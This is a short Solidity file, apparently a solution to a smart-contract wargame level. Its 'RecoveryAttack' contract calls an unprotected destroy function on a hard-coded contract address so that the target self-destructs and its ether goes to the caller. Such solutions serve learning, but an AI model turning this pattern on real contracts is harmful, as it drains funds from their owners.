// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken{
    function destroy(address) external;
}
contract RecoveryAttack{
    address public target = 0x02cb6E52803d8E380b644E2bA95DFDdC1e31C4Ff;
    function attack()public{
        ISimpleToken(target).destroy(msg.sender);
    }
}
